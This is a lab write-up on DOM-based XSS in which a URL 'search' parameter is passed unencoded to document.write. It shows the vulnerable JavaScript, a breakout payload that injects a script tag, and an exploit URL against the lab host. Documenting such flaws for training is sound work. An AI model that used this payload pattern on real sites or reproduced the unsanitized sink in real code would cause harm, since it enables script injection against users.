# Lab:  DOM-Based XSS in document.write Sink Using Source Location.search


This lab is vulnerable to **DOM-Based XSS** because the application reads input from the URL's `search` parameter and writes it directly into the page using `document.write()` without sanitization.

## Vulnerable Code

```javascript
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms=' + query + '">');
}

var query = (new URLSearchParams(window.location.search)).get('search');

if (query) {
    trackSearch(query);
}
```

## Analysis

### Source

```javascript
window.location.search
```

### Sink

```javascript
document.write()
```

The value of the `search` parameter is taken from the URL and inserted directly into the HTML, allowing an attacker to inject arbitrary JavaScript.

## Exploitation

Payload:

```html
"><script>alert(1)</script>
```

Exploit URL:

```text
https://LAB-ID.web-security-academy.net/?search="><script>alert(1)</script>
```

## Result

The payload breaks out of the `src` attribute and injects a `<script>` tag:

```html
<img src="/resources/images/tracker.gif?searchTerms=">
<script>alert(1)</script>
```

When the page loads, the JavaScript executes and an alert box appears, solving the lab.


The vulnerability occurs because user-controlled data from `window.location.search` is passed directly to `document.write()` without validation or encoding, leading to **DOM-Based Cross-Site Scripting (XSS)**.
